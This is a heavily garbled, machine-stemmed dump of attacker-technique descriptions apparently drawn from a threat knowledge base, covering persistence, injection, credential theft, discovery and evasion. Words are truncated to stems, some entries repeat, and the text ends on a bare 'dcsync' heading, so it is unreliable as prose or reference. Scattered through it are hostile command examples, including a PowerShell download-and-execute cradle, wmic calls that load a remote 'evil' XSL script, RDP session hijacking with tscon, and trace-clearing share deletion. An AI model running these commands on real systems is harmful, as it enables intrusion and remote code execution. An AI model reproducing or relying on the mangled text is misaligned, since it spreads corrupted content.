advers perform softw pack virt machin softw protect cont cod softw pack method compress encrypt execut pack execut chang fil sign attempt avoid signature-based detect decompress techn decompress execut cod mem virt machin softw protect transl execut origin cod spec form spec virt machin run virt machin cal run cod eset finf jan 2018 util us perform softw pack cal pack exampl pack mpress upx comprehend list know pack avail advers cre pack techn leav artifact well-known pack evad defens awesom execut pack
serverless
advers comprom serverless cloud infrastruct cloudfl work aw lambd funct us target util serverless infrastruct advers mak difficult attribut infrastruct us op back comprom serverless runtim environ lev eith respond direct infect machin proxy http traff adversary-owned command control serv blackw malw cloudfl work aw lambd redirect traff gen funct appear com subdomain common cloud provid difficult distinct ordin traff provid detect command control cloud blackw malw cloudfl work
web protocol
advers commun us apply lay protocol assocy web traff avoid detection/network filt blend ex traff command remot system oft result command emb within protocol traff cli serv protocol http http carry web traff common environ http/s packet many field head dat cont advers abus protocol commun system control within victim network also mim norm expect traff
vis bas
advers abus vis bas vb execut vb program langu cre microsoft interop many window technolog compon object model http nat ap http window ap although tag leg plan fut evolv vb integr support .net framework cross-platform .net cor vb .net mar 2020 vb microsoft der langu bas vb also cre vis bas apply vba vbscript vba event-driven program langu build microsoft off wel sev third-party apply microsoft vba wikiped vba vba en docu contain macro us autom execut task funct host vbscript default script langu window host also us plac javascrib http html apply hta webp serv internet expl though modern brows com vbscript support microsoft vbscript advers us vb payload execut malicy command common malicy us includ autom execut behavy vbscript emb vba cont spearph attach http payload also involv mark-of-the-web bypass http en execut default vbs macro block
hid fil system
advers us hid fil system cont malicy act us sec tool fil system provid structure stor access dat phys stor typ us eng fil system apply allow access fil direct abstract phys loc ex disk sect standard fil system includ fat ntfs ext4 apf fil system also contain structure volum boot record vbr mast fil tabl mft ntfs malwaretech vfs nov 2014 advers us abstract fil system sep standard fil system pres infect system advers hid pres malicy compon fil input/output sec tool hid fil system sometim ref virt fil system impl num way on impl would stor fil system reserv disk spac unus disk structure standard fil system partit malwaretech vfs nov 2014 fireey bootkit anoth impl could advers drop port partit im fil top standard fil system eset comr 2020 advers also frag fil across ex fil system structure non-standard way kaspersky equ qa
systemd serv
advers cre mod systemd serv rep execut malicy payload part persist systemd serv man common us man background daemon process also know serv system resourc linux man-pages systemd janu 2014 freedesktop.org linux systemd 29sep2018 systemd default init init system many linux distribut start deb 8 ubuntu 15.04 cento 7 rhel 7 fedor 15 replac leg init system includ sysvinit upstart remain backward compat af init system systemd util config fil know serv unit control serv boot condit default unit fil stor < cod > /etc/systemd/system < /code > < cod > /usr/lib/systemd/system < /code > direct fil extend < cod > .service < /code > serv unit fil contain num direct execut system command execstart execstartpr execstartpost direct cov execut command serv start man 'systemctl ' system start serv set autom start execreload direct cov serv restart execstop execstoppost direct cov serv stop man 'systemctl ' advers us systemd funct est persist access victim system cre and/or mod serv unit fil caus systemd execut malicy command system boot anomal rock march 2019 advers typ requir root privileg create/modify serv unit fil < cod > /etc/systemd/system < /code > < cod > /usr/lib/systemd/system < /code > direct low privileg us create/modify serv unit fil direct < cod > ~/.config/systemd/user/ < /code > achiev user-level persist rapid7 serv persist 22june2016
rdp hijack
advers hijack legitim us ’ remot desktop sess mov lat within environ remot desktop common feat op system allow us log interact sess system desktop graph us interfac remot system microsoft ref impl remot desktop protocol rdp remot desktop serv rds technet remot desktop serv advers perform rdp sess hijack involv ste legitim us remot sess typ us not someon els try ste sess system permit us termin serv consol ` c \windows\system32\tscon.exe sess numb ste ` advers hijack sess without nee cred prompt us rdp hijack korznikov do remot loc act disconnect sess rdp hijack med also lead remot system discovery http privileg esc ste domain admin high privileg account sess do us nat window command also ad feat red team tool kal redsnarf
cre account
advers cre account maintain access victim system sufficy level access cre account us est second cred access requir persist remot access tool deploy system account cre loc system within domain cloud ten cloud environ advers cre account access spec serv reduc chant detect
xdg autostart entry
advers mod xdg autostart entry execut program command system boot linux desktop environ xdg comply impl funct xdg autostart entry entry allow apply autom start startup desktop environ us logon default xdg autostart entry stor within < cod > /etc/xdg/autostart < /code > < cod > ~/.config/autostart < /code > direct .desktop fil extend fre desktop apply autostart feb 2006 within xdg autostart entry fil < cod > typ < /code > key spec entry apply typ 1 link typ 2 direct typ 3 < cod > nam < /code > key ind arbit nam assign cre < cod > exec < /code > key ind apply command lin argu execut fre desktop entry key advers us xdg autostart entry maintain persist execut malicy command payload remot access tool startup desktop environ command includ xdg autostart entry execut us logon context cur log us advers also us masquerad http mak xdg autostart entry look assocy legitim program
serv
advers comprom third-party serv us target us serv allow advers stag launch execut op post-compromise act advers util serv vary task includ command control instead purchas serv http virt priv serv http advers comprom third-party serv support op advers also comprom web serv support wat hol op drive-by comprom http
cloud serv discovery
advers attempt enum cloud serv run system gain access method diff platform-as-a-service paa infrastructure-as-a-servic ia software-as-a-servic saa many serv ex throughout vary cloud provid includ continu integr continu delivery ci/cd lambd funct az ad etc advers attempt discov inform serv en throughout environ az tool ap az ad graph ap az resourc man ap enum resourc serv includ apply man group resourc policy definit rel access id az - resourc man ap az ad graph ap stormspot op sourc tool enum construct graph az resourc serv pacu op sourc aw exploit framework support sev method discov cloud serv az - stormspot github pacu
spac filenam
advers hid program tru filetyp chang extend fil certain fil typ spec work .app extend append spac end filenam chang fil process op system exampl mach-o execut fil cal evil.bin doubl click us launch terminal.app execut fil renam evil.txt doubl click us launch default text edit apply execut bin howev fil renam evil.txt not spac end doubl click us tru fil typ determin o handl appropry bin execut mac backdo back advers us feat trick us doubl click benign-looking fil form ultim execut someth malicy
remot system discovery
advers attempt get list system ip address hostnam log ident network us lat mov cur system funct could ex within remot access tool en util avail op system could also us ping http < cod > net view < /code > us net http advers also analys dat loc host fil ex < cod > c \windows\system32\drivers\etc\hosts < /code > < cod > /etc/hosts < /code > pass mean loc arp http cach entry ord discov pres remot system environ advers also target discovery network infrastruct wel lev network dev cli http command network dev gath detail inform system within network e.g < cod > show cdp neighb < /code > < cod > show arp < /code > us-cert-ta18-106a cis ar21-126a fivehand 2021
network serv discovery
advers attempt get list serv run remot host loc network infrastruct dev includ vuln remot softw exploit common method acquir inform includ port and/or vuln scan us tool bring onto system cis ar21-126a fivehand 2021 within cloud environ advers attempt discov serv run cloud host addit cloud environ connect on-premises environ advers abl ident serv run non-cloud system wel within maco environ advers us nat bonjo apply discov serv run maco host within network bonjo mdnsresponder daemon autom reg advert host ’ reg serv network exampl advers us mdns query < cod > dns-sd -b _ssh._tcp < /code > find system broadcast ssh serv appl doco bonjo describ maco apt act bradley
domain property
advers gath inform victim network domain us target inform domain property includ vary detail includ domain victim own wel admin dat ex nam registr etc direct act inform contact email address phon numb busy address nam serv advers gath inform vary way direct collect act via act scan http phish inform http inform victim domain property also expos advers via onlin access dat set ex who http who dns dumpst circ pass dns third-party cloud provid us inform also expos publ avail ap endpoint getuserrealm autodiscov off 365 environ az act direct reconna off 265 az domain avail gath inform rev opportun form reconnaiss ex search op techn databas http search op websites/domain http phish inform http est op resourc ex acquir infrastruct http comprom infrastruct http and/or init access ex phish http
softw discovery
advers attempt get list softw softw vert inst system cloud environ advers us inform softw discovery http autom discovery shap follow-on behavy includ wheth advers ful infect target and/or attempt spec act advers attempt enum softw vary reason fig sec meas pres comprom system vert softw vuln exploit privileg esc http
cloud serv dashboard
advers us cloud serv dashboard gui ste cred gain us inform op cloud environ spec serv resourc feat exampl gcp command cent us view asset find pot sec risk run addit query find publ ip address op port googl command cent dashboard depend config environ advers abl enum inform via graph dashboard ap allow advers gain inform without mak ap request
thread loc stor
advers inject malicy cod process via thread loc stor tl callback ord evad process-based defens wel poss elev privileg tl callback inject method execut arbit cod address spac sep liv process tl callback inject involv manip point insid port execut pe redirect process malicy cod reach cod legitim entry point tl callback norm us o setup and/or cleanup dat us thread manip tl callback perform alloc writ spec offset within process ’ mem spac us process inject http techn process hollow http fireey tl nov 2017 run cod context anoth process allow access process mem system/network resourc poss elev privileg execut via tl callback inject also evad detect sec produc sint execut mask legitim process
debug evas
advers employ vary mean detect avoid debug debug typ us defend trac and/or analys execut pot malw payload processhack github debug evas includ chang behavy bas result check pres artifact ind debug environ simil virtualization/sandbox evas http advers detect debug alt malw diseng victim cont cor funct impl also search debug artifact drop second addit payload spec check vary bas target and/or advers involv nat ap http funct cal < cod > isdebuggerpres < /code > < cod > ntqueryinformationprocess < /code > man check < cod > beingdebug < /code > flag process environ block peb check debug artifact also seek enum hardw breakpoint interrupt assembl opcod tim check meas exceiv rais cur process assum pres debug would “ swallow ” handl pot er hasherezad debug alkhas debug vxunderground debug advers us inform learn debug check autom discovery shap follow-on behavy debug also evad detach process flood debug log meaningless dat via mess produc loop nat ap http funct cal < cod > outputdebugstringw < /code > wardl evilquest parti checkpoint dridex jan 2021
spac filenam
advers hid program tru filetyp chang extend fil certain fil typ spec work .app extend append spac end filenam chang fil process op system exampl mach-o execut fil cal < cod > evil.bin < /code > doubl click us launch terminal.app execut fil renam < cod > evil.txt < /code > doubl click us launch default text edit apply execut bin howev fil renam < cod > evil.txt < /code > not spac end doubl click us tru fil typ determin o handl appropry bin execut mac backdo back advers us feat trick us doubl click benign-looking fil form ultim execut someth malicy
re-opened apply
advers mod plist fil autom run apply us log us log restart via maco graph us interfac gui prompt provid us checkbox reop window log back re-open window mac select apply cur op ad property list fil nam < cod > com.apple.loginwindow uuid .plist < /code > within < cod > ~/library/preferences/byhost < /code > direct method mac malw persist wardl persist chapt apply list fil autom reop upon us ’ next logon advers est persist http ad malicy apply path < cod > com.apple.loginwindow uuid .plist < /code > fil execut payload us log
seo poison
advers poison mech influ search engin optim seo lur stag cap toward pot victim search engin typ display result us bas purchas ad wel sit ’ ranking/score/reputation calc web crawl algorithm atla seo malwarebyt seo help facilit drive-by comprom http advers stag cont explicit manip seo rank ord promot sit host malicy payload drive-by target http within search engin poison seo rank involv vary trick stuff keyword includ form hid text comprom sit keyword could rel interests/browsing habit intend victim wel broad season popul top e.g elect trend new zscaler seo atla seo advers also purchas plant incom link stag cap ord boost sit ’ calc relev reput malwarebyt seo dfir report gootload seo poison also combin evas redirect cloak mech meas mous mov serv cont bas brows us ag us language/localization set http head ord fee seo input avoid scrutiny defend zscaler seo sopho gootload
pas hash
advers “ pas hash ” us ste password hash mov lat within environ bypass norm system access control pas hash pth method auth us without access us cleartext password method bypass standard auth step requir cleartext password mov direct port auth us password hash perform pth valid password hash account us capt us cred access http techn capt hash us pth auth us auth pth us perform act loc remot system advers also us ste password hash overpass hash simil pth involv us password hash auth us also us password hash cre valid kerbero ticket ticket us perform pas ticket http attack stealthbit overpass-the-hash
exfilt phys med
advers attempt exfilt dat via phys med remov driv certain circumst air-gapped network comprom exfilt could occ via phys med dev introduc us med could extern hard driv usb driv cellul phon mp3 play remov stor process dev phys med dev could us fin exfilt point hop otherw disconnect system
dll side-loading
advers execut malicy payload side-loading dlls simil dll search ord hijack http side-loading involv hijack dll program load rath plant dll within search ord program wait victim apply invok advers direct side-load payload plant invok legitim apply execut payload side-loading tak adv dll search ord us load posit victim apply malicy payload alongsid advers lik us side-loading mean mask act perform legitim trust pot elev system softw process benign execut us side-load payload flag delivery and/or execut advers payload also encrypted/pack otherw obfusc load mem trust process fireey dll side-loading
ingr tool transf
advers transf tool fil extern system comprom environ tool fil cop extern adversary-controlled system victim network command control channel altern protocol ftp http pres advers also transfer/spread tool victim dev within comprom environ i.e lat tool transf http fil also transf us vary web serv http wel nat otherw pres tool victim system ptsecurity cobalt dec 2016 window advers us vary util download tool ` cop ` ` fing ` powershel http command < cod > iex new-object net.webcli .downloadstring < /code > < cod > invoke-webrequest < /code > linux maco system vary util also ex ` curl ` ` scp ` ` sftp ` ` tftp ` ` rsynt ` ` fing ` ` wget ` t1105_lolbas
addit email deleg permit
advers grant addit permit level maintain persist access adversary-controlled email account exampl < cod > add-mailboxpermission < /code > powershel http cmdlet avail on-premises exchang cloud-bas serv off 365 ad permit mailbox microsoft - add-mailboxpermission fireey apt35 2018 crowdstrik hid plain sight 2018 googl workspac deleg en via googl admin consol us deleg account via gmail set gmail deleg googl ens inform saf advers also assign mailbox fold permit individ fold permit rol off 365 environ advers assign default anonym us permit rol top inform stor root inbox mailbox fold assign on us permit fold advers util account ten maintain persist target us ’ mail fold remedy hard strategy microsoft 365 defend unc2452 us persist threat incid wel bec busy email comprom incid advers ad addit cloud rol http account wish comprom en us addit techn gain access system exampl comprom busy account oft us send mess account network target busy cre inbox rul ex intern spearph http mess evad spam/phishing detect mech bienstock d. - defend o365 - 2019
cod sign cert
advers buy and/or ste cod sign cert us target cod sign process digit sign execut script confirm softw auth guar cod alt corrupt cod sign provid level auth program develop guar program tamp wikiped cod sign us and/or sec tool trust sign piec cod unsign piec cod ev n't know issu cert auth pri cod sign http advers purchas ste cod sign cert us op purchas cod sign cert do us front org us inform ste prevy comprom ent allow advers valid cert provid ent advers also ste cod sign mat direct comprom third-party
network shar connect remov
advers remov shar connect long us ord cle trac op window shar driv window admin shar http connect remov long nee net http exampl util us remov network shar connect < cod > net us \\system\share /delete < /code > command technet net us
serverless execut
advers abus serverless comput integr autom serv execut arbit cod cloud environ many cloud provid off vary serverless resourc includ comput engin apply integr serv web serv advers abus resourc vary way mean execut arbit command exampl advers us serverless funct execut malicy cod crypto-mining malw i.e resourc hijack http cado sec denon advers also cre funct en comprom cloud environ exampl advers us ` iam passrol ` permit aw ` iam.serviceaccounts.actas ` permit googl cloud ad addit cloud rol http serverless cloud funct abl perform act origin us rhino sec lab aw privileg esc rhingo sec lab gcp privileg esc serverless funct also invok respons cloud ev i.e ev trig execut http pot en persist execut tim exampl aw environ advers cre lambd funct autom ad addit cloud cred http us correspond cloudwatch ev rul invok funct whenev new us cre backdo aw account simil advers cre pow autom workflow off 365 environ forward email us receiv cre anonym shar link whenev us grant access docu sharepoint varon pow autom dat exfilt microsoft dart cas report 001
window man instru ev subscrib
window man instru wmi us instal ev filt provid consum bind execut cod defin ev occ advers us cap wmi subscrib ev execut arbit cod ev occ provid persist system advers attempt evad detect techn compil wmi script window man object mof fil .mof extend del wmi persist exampl ev subscrib wal clock tim comput uptim kazanciy 2014 sev threat group report us techn maintain persist mandy m-trends 2015
launch daemon
per appl ’ develop docu maco o x boot launchd run fin system init process load paramet launch-on-demand system-level daemon property list plist fil find < cod > /system/library/launchdaemons < /code > < cod > /library/launchdaemons < /code > appledoc launch ag daemon launchdaemon property list fil point execut launch method mac malw persist advers instal new launch daemon config execut startup us launchd launchctl load plist appropry direct osx malw detect daemon nam disgu us nam rel op system benign softw wirelurk launch daemon cre admin privileg execut root privileg advers also us serv esc privileg admin root plist fil permit must root wheel script program point requir poss poor config allow advers mod cur launch daemon ’ execut gain persist privileg esc
ptrace system cal
advers inject malicy cod process via ptrace process trac system cal ord evad process-based defens wel poss elev privileg ptrace system cal inject method execut arbit cod address spac sep liv process ptrace system cal inject involv attach mod run process ptrace system cal en debug process observ control anoth process individ thread includ chang mem reg valu ptrace man ptrace system cal inject common perform writ arbit cod run process ex < cod > malloc < /code > invok mem < cod > ptrace_setregs < /code > set reg contain next instruct execut ptrace system cal inject also do < cod > ptrace_poketext < /code > / < cod > ptrace_pokedata < /code > cop dat spec address target process ’ mem ex cur address next instruct ptrace man med ptrace jul 2018 ptrace system cal inject poss target process non-child process and/or higher-privileges bh linux inject run cod context anoth process allow access process mem system/network resourc poss elev privileg execut via ptrace system cal inject also evad detect sec produc sint execut mask legitim process
dynam ap resolv
advers obfusc dynam resolv ap funct cal malw ord cont malicy funct impair defend analys malw common us vary nat ap http funct provid o perform vary task involv process fil system artifact ap funct cal malw leav stat artifact string payload fil defend analyst also uncov funct bin fil execut via import address tabl iat structure help dynam link cal cod shar mod provid funct huntress ap hash ir ap hash avoid stat defend analys advers us dynam ap resolv cont malw charact funct simil softw pack http dynam ap resolv chang fil sign obfusc malicy ap funct cal resolv invok runtim vary method us obfusc malw cal ap funct exampl hash funct nam common stor malw lieu lit string malw us hash ident man reproduc link load process us funct ` getprocaddress ` ` loadlibr ` hashes/identifier also obfusc us encrypt string manip trick requir vary form deobfuscate/decod fil inform http execut blackh ap pack drakon hinvok huntress ap hash
remot desktop protocol
advers us valid account http log comput us remot desktop protocol rdp advers perform act logged-on us remot desktop common feat op system allow us log interact sess system desktop graph us interfac remot system microsoft ref impl remot desktop protocol rdp remot desktop serv rds technet remot desktop serv advers connect remot system rdp/rds expand access serv en allow access account know cred advers lik us cred access techn acquir cred us rdp advers also us rdp conjunct access feat http termin serv dll http persist alperovitch malw
logon script window
advers us window logon script autom execut logon init est persist window allow logon script run whenev spec us group us log system technet logon script do via ad path script < cod > hkcu\environment\userinitmprlogonscript < /code > reg key hexacorn logon script advers us script maintain persist singl system depend access config logon script eith loc cred admin account necess
listpl
advers abus list-view control inject malicy cod hijack process ord evad process-based defens wel poss elev privileg listpl method execut arbit cod address spac sep liv process cod execut via listpl also evad detect sec produc sint execut mask legitim process list-view control us interfac window us display collect item microsoft list view control inform apply list-view set stor within process ' mem < cod > syslistview32 < /code > control listpl form message-passing shat attack perform cop cod virt address spac process us list-view control us cod custom callback sort list item modexp window process inject advers must first cop cod target process ’ mem spac perform vary way includ direct obtain handl < cod > syslistview32 < /code > child victim process window via window ap cal < cod > findwindow < /code > and/or < cod > enumwindow < /code > process inject http method vary listpl alloc mem target process us window mess cop payload avoid us high monit < cod > writeprocessmem < /code > funct exampl advers us < cod > postmess < /code > and/or < cod > sendmess < /code > ap funct send < cod > lvm_setitemposition < /code > < cod > lvm_getitemposition < /code > mess effect cop payload 2 byt tim alloc mem eset invisimol jun 2020 fin payload trig send < cod > lvm_sortitems < /code > mess < cod > syslistview32 < /code > child process window payload within new alloc buff pass execut < cod > listview_sortitems < /code > callback
domain policy mod
advers mod config set domain evad defens and/or esc privileg domain environ domain provid cent mean man comput resourc ex comput us account act interact network policy domain also includ config set apply domain multi-domain/forest environ mod domain set includ alt domain group policy object gpo chang trust set domain includ fed trust sufficy permit advers mod domain policy set sint domain config set control many interact within act direct ad environ gre numb pot attack stem abus exampl abus includ mod gpo push malicy schedule task http comput throughout domain environ adsec gpo persist 2016 wald0 guid gpo harmj0y abus gpo permit mod domain trust includ advers control domain control access tok subsequ acceiv victim domain resourc microsoft - custom guid rec nation-state cyb attack advers also chang config set within ad environ impl rog domain control http advers temp mod domain policy carry malicy act revert chang remov suspicy ind
xsl script process
advers bypass apply control obsc execut cod emb script insid xsl fil extens stylesheet langu xsl fil common us describ process rend dat within xml fil support complex op xsl standard includ support emb script vary langu microsoft xslt script mar 2017 advers abus funct execut arbit fil pot bypass apply control simil trust develop util proxy execut http microsoft common lin transform util bin msxsl.exe microsoft msxsl.exe inst us execut malicy javascrib emb within loc remot url ref xsl fil penet test lab msxsl july 2017 sint msxsl.exe inst default advers lik nee pack drop fil reaqt msxsl spearph mar 2018 msxsl.exe tak two main argu xml sourc fil xsl stylesheet sint xsl fil valid xml advers cal xsl fil twic us msxsl.exe advers also giv xml/xsl fil arbit fil extend xsl bypass mar 2019 command-line exampl penet test lab msxsl july 2017 xsl bypass mar 2019 < cod > msxsl.exe custom xml script xsl < /code > < cod > msxsl.exe script xsl script xsl < /code > < cod > msxsl.exe script jpeg script jpeg < /code > anoth vary techn dub “ squiblytwo ” involv us window man instru http invok jscript vbscript within xsl fil lolba wmic techn also execut local/remote script simil regsvr32 http / squiblydoo counterpart lev trust built-in window tool advers abus alia window man instru http provid util /format switch xsl bypass mar 2019 command-line exampl xsl bypass mar 2019 lolba wmic loc fil < cod > wmic process list /format evil xsl < /code > remot fil < cod > wmic o get /format ” http com/evil xsl ” < /code >
scan databas
advers search within publ scan databas inform victim us target vary onlin serv continu publ result internet scans/survey oft harvest inform act ip address hostnam op port cert ev serv ban shod advers search scan databas gath act inform threat act us onlin resourc lookup tool harvest inform serv advers seek inform already ident target us dataset discov opportun success breach inform sourc rev opportun form reconnaiss ex act scan http search op websites/domain http est op resourc ex develop cap http obtain cap http and/or init access ex extern remot serv http exploit public-facing apply http
hid fil direct
advers set fil direct hid evad detect mech prev norm us accid chang spec fil system op system conceiv ‘ hid ’ fil fil ’ show us brows fil system gui us norm command command lin us must explicit ask show hid fil eith via sery graph us interfac gui prompt command lin switch < cod > dir /a < /code > window < cod > l –a < /code > linux maco linux mac us mark spec fil hid simply put “ ” first charact fil fold nam sof komplex trod ant mac malw fil fold start period ‘ ’ default hid view find apply standard command-line util lik “ l ” us must spec chang set fil view fil maco also mark uf_hidden flag prev see finder.app stil allow see terminal.app wirelurk window us mark spec fil hid us attrib.exe bin many apply cre hid fil fold stor inform ’ clut us ’ workspac exampl ssh util cre .ssh fold ’ hid contain us ’ know host key advers us adv hid fil fold anywh system evad typ us system analys incorp investig hid fil
cre snapshot
advers cre snapshot dat backup within cloud account evad defens snapshot point-in-time cop ex cloud comput compon virt machin vm virt hard driv volum advers lev permit cre snapshot ord bypass restrict prev access ex comput serv infrastruct unlik revert cloud inst http advers revert snapshot evad detect remov evid pres advers cre cloud inst http mount on cre snapshot inst apply policy allow advers access cre inst firewal policy allow inbound outbound ssh access mandy m-trends 2020
determin phys loc
advers gath victim phys loc us target inform phys loc target org includ vary detail includ key resourc infrastruct hous phys loc also ind leg jurisdict and/or auth victim op within advers gath inform vary way direct elicit via phish inform http phys loc target org also expos advers via onlin access dat set ex search victim-owned websit http soc med http threatpost broadvo leak sec edg search gath inform rev opportun form reconnaiss ex phish inform http search op websites/domain http est op resourc ex develop cap http obtain cap http and/or init access ex phish http hardw addit http
off test
advers abus microsoft off off test reg key obtain persist comprom system off test reg loc ex allow us spec arbit dll execut every tim off apply start reg key think us microsoft load dlls test debug purpos develop off apply reg key cre default off instal hexacorn off test palo alto off test sof ex us glob reg key off test feat < cod > hkey_current_user\software\microsoft\office test\special\perf < /code > < cod > hkey_local_machine\software\microsoft\office test\special\perf < /code > advers ad reg key spec malicy dll execut whenev off apply word excel start
develop cap
advers build cap us target rath purchas fre download ste cap advers develop cap in-house process ident develop requir build solv malw exploit self-signed cert advers develop cap support op throughout num phas advers lifecyc mandy apt1 kaspersky sof bitdefend strongpity jun 2020 talo prometh jun 2020 legitim develop effort diff skil set requir develop cap skil nee loc in-house nee contract us contract consid extend advers develop cap provid advers play rol shap requir maintain degr exclud cap
dynam dat exchang
window dynam dat exchang dde client-server protocol one-tim and/or continu inter-process commun ipc apply link est apply autonom exchang transact consist string warm dat link not dat item chang hot dat link duply chang dat item request command execut object link emb ol abl link dat docu origin impl dde despit supers com dde en window 10 microsoft off 2016 via reg key bleepingcomput dde dis word dec 2017 microsoft adv170021 dec 2017 microsoft dde adv nov 2017 advers us dde execut arbit command microsoft off docu poison dde command sensepost p dde 2016 kettl csv dde aug 2014 direct emb fil enigm rev dde jan 2018 us del execut via phish campaign host web cont avoid us vis bas apply vba macro sensepost macroless dde oct 2017 dde could also lev advers op comprom machin direct access command lin execut
ntds
advers attempt access cre cop act direct domain databas ord ste cred inform wel obtain inform domain memb dev us access right default ntds fil ntds.dit loc < cod > systemroot \ntds\ntds.dit < /code > domain control wikiped act direct addit look ntds fil act domain control advers search backup contain simil inform metcalf 2015 follow tool techn us enum ntds fil cont entir act direct hash volum shadow cop secretsdump.py us in-built window tool ntdsutil.exe invoke-ninjacopy
snmp mib dump
advers target man inform bas mib collect and/or min valu inform network man us simpl network man protocol snmp mib config reposit stor vary inform access via snmp form object ident oid oid ident vary read set permit act man task config chang remot mod vary snmp giv admin gre insight system system inform describ hardw phys loc softw pack san inform sec read room sec snmp sec snmp mib also contain dev op inform includ run config rout tabl interfac detail advers us snmp query collect mib cont direct snmp-managed dev ord collect network inform allow advers build network map facilit fut target exploit us-cert-ta18-106a cisco blog leg dev attack
steganograph
advers us steganograph techn hid command control traff mak detect effort difficult steganograph techn us hid dat digit mess transf system hid inform us command control comprom system cas pass fil emb us steganograph im docu fil us command control
malicy link
advers rely upon us click malicy link ord gain execut us subject soc engin get click link lead cod execut us act typ observ follow-on behavy spearph link http click link also lead execut techn exploit brows apply vuln via exploit cli execut http link also lead us download fil requir execut via malicy fil http
apply access tok
advers us ste apply access tok bypass typ auth process access restrict account inform serv remot system tok typ ste us serv us lieu login cred apply access tok us mak auth ap request behalf us serv common us way access resourc cloud container-based apply software-as-a-servic saa auth0 - alway us access tok sec ap sept 2019 aw gcp environ advers trig request short-lived access tok privileg anoth us account googl cloud serv account cred aw temp sec cred advers us tok request dat perform act origin account could permit feat misconfig – exampl allow us request tok particul account - advers abl gain init access cloud account esc privileg rhino sec lab enum aw rol oau on common impl framework issu tok us access system framework us collab ver us determin act us allow perform id est tok allow act auth without pass act cred us theref comprom tok grant advers access resourc sit malicy apply okt exampl cloud-bas email serv oau access tok grant malicy apply pot gain long-term access feat us account refresh tok en background access award microsoft id platform access 2019 oau access tok advers us user-granted rest ap perform funct email search contact enum staaldraad phish oau 2017 comprom access tok us init step comprom serv exampl tok grant access victim ’ prim email advers abl extend access serv target subscrib trig forget password routin direct ap access tok neg effect second auth fact immun intuit countermeas lik chang password access abus ap channel difficult detect ev serv provid end access stil align wel legitim workflow
lsass driv
advers mod ad lsass driv obtain persist comprom system window sec subsystem set compon man enforc sec policy comput domain loc sec auth lsa main compon respons loc sec policy us auth lsa includ multipl dynam link libr dlls assocy vary sec funct run context lsa subsystem serv lsass lsass.exe process microsoft sec subsystem advers target lsass driv obtain persist eith replac ad illegitim driv hijack execut flow http advers us lsa op continu execut malicy payload
serv execut
advers abus window serv control man execut malicy command payload window serv control man < cod > services.exe < /code > interfac man manip serv microsoft serv control man serv control man access us via gui compon wel system util < cod > sc.exe < /code > net http psexec http also us execut command payload via temp window serv cre serv control man ap russinovich sysintern tool psexec http < cod > sc.exe < /code > acceiv remot serv argu us conduc remot execut advers lev mech execut malicy cont do eith execut new mod serv techn execut us conjunct window serv http serv persist privileg esc
cloud account
advers obtain abus cred cloud account mean gain init access persist privileg esc defens evas cloud account cre config org us us remot support serv admin resourc within cloud serv provid saa apply cas cloud account fed tradit id man system window act direct aw id fed googl fed gc microsoft deploy ad fed comprom cred cloud account us harvest sensit dat onlin stor account databas access cloud account also abus gain init access network abus trust rel http simil domain account http comprom fed cloud account allow advers easy mov lat within environ cloud account comprom advers perform account manip http - exampl ad addit cloud rol http - maintain persist pot esc privileg
environ key
advers environ key payload feat malw evad defens constraint execut spec target environ environ key us cryptograph constrain execut act bas advers supply environ spec condit expect pres target environ key impl execut guardrail http util cryptograph techn der encryption/decrypt key spec typ valu giv comput environ ek clueless ag valu der target-specific el us gen decrypt key encrypt payload target-specific valu der spec network shar phys dev software/softwar vert fil join ad domain system tim local/extern ip address kaspersky gauss whitepap proofpoint rout malvert ek imp malw analys environ key hta ebowl genet malw gen decrypt key target-specific environ valu environ key mak sandbox detect anti-virus detect crowdsourc inform revers engin difficult kaspersky gauss whitepap ebowl genet malw difficul slow incid respons process help advers hid tact techn proc ttps simil obfusc fil inform http advers us environ key help protect ttps evad detect environ key us del encrypt payload target us target-specific valu decrypt payload execut kaspersky gauss whitepap ek imp malw analys environ key hta ebowl genet malw demigu guardrail rout logo util target-specific valu decrypt payload advers avoid pack decrypt key payload send pot monit network connect depend techn gath target-specific valu revers engin encrypt payload exceiv difficult kaspersky gauss whitepap us prev expos cap environ intend comprom op within lik execut guardrail http environ key us prev expos cap environ intend comprom op within act distinct typ virtualization/sandbox evas http us virtualization/sandbox evas http involv check know sandbox valu continu execut match us environ key involv check expect target-specific valu must match decrypt subsequ execut success
fallback channel
advers us fallback altern commun channel prim channel comprom inaccess ord maintain rely command control avoid dat transf threshold
ntfs fil attribut
advers us ntfs fil attribut hid malicy dat ord evad detect every new technolog fil system ntfs form partit contain mast fil tabl mft maintain record every file/directory partit spectorop host-based jul 2017 within mft entry fil attribut microsoft ntfs fil attribut aug 2010 extend attribut ea dat know altern dat stream ad on dat attribut pres us stor arbit dat ev complet fil spectorop host-based jul 2017 microsoft fil stream malwarebyt ad july 2015 microsoft ad mar 2014 advers stor malicy dat bin fil attribut metadat instead direct fil do evad defens stat ind scan tool anti-virus journey ir zeroaccess ntfs ea malwarebyt ad july 2015
kerberoast
advers abus valid kerbero ticket-granting ticket tgt sniff network traff obtain ticket-granting serv tgs ticket vuln brut forc http empir invokekerberoast oct 2016 adsec crack kerbero dec 2015 serv princip nam spns us un ident inst window serv en auth kerbero requir spns assocy least on serv logon account account spec task run serv microsoft detect kerberoast feb 2018 microsoft spn microsoft setspn san attack kerbero nov 2014 harmj0y kerberoast nov 2016 advers possess valid kerbero ticket-granting ticket tgt request on kerbero ticket-granting serv tgs serv ticket spn domain control dc empir invokekerberoast oct 2016 adsec crack kerbero dec 2015 port ticket encrypt rc4 algorithm mean kerbero 5 tgs-rep etyp 23 hash serv account assocy spn us priv key thu vuln offlin brut forc http attack expos plaintext cred adsec crack kerbero dec 2015 empir invokekerberoast oct 2016 harmj0y kerberoast nov 2016 behavy could execut us serv ticket capt network traff adsec crack kerbero dec 2015 crack hash en persist http privileg esc http lat mov http via access valid account http san attack kerbero nov 2014
ntfs fil attribut
every new technolog fil system ntfs form partit contain mast fil tabl mft maintain record every file/directory partit spectorop host-based jul 2017 within mft entry fil attribut microsoft ntfs fil attribut aug 2010 extend attribut ea dat know altern dat stream ad on dat attribut pres us stor arbit dat ev complet fil spectorop host-based jul 2017 microsoft fil stream malwarebyt ad july 2015 microsoft ad mar 2014 advers stor malicy dat bin fil attribut metadat instead direct fil do evad defens stat ind scan tool anti-virus journey ir zeroaccess ntfs ea malwarebyt ad july 2015
dcsync
